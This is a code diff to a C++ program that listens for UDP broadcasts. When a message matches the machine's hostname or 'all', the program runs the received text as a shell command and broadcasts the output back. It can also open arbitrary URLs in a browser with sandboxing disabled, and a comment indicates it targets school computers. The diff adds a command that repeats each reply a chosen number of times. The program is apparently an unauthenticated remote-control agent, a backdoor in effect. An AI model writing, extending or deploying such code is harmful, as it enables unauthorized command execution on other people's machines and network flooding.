@@ -126,9 +126,12 @@ int main() {
 
     std::vector<std::string> msg;
 
+    socklen_t addrLen = sizeof(broadcastAddr);
+    socklen_t sendLen = sizeof(send_broadcastAddr);
+
+    int msg_count = 1;
+
     while (true) {
-        socklen_t addrLen = sizeof(broadcastAddr);
-        socklen_t sendLen = sizeof(send_broadcastAddr);
         ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
         msg = split((std::string)buffer);
 
@@ -136,11 +139,16 @@ int main() {
             if(msg[0] == exec("hostname") || msg[0] == "all"){
                 if(msg[1] == "cmd"){
                     std::string answ = exec(msg[2].c_str());
-                    sendto(send_sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&send_broadcastAddr, addrLen);
+                    for(int i = 0; i < msg_count; ++i){
+                        sendto(send_sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&send_broadcastAddr, addrLen);
+                    }
                 }
                 else if(msg[1] == "open url"){
                         //ours school pc using yandex
                         system((std::string("yandex-browser-stable --no-sandbox ") + msg[2]).c_str());
+                }
+                else if(msg[1] == "set msg count"){
+                    msg_count = std::stoi(msg[2]);
                 }
                 //==========================================================================
                 //coming soon
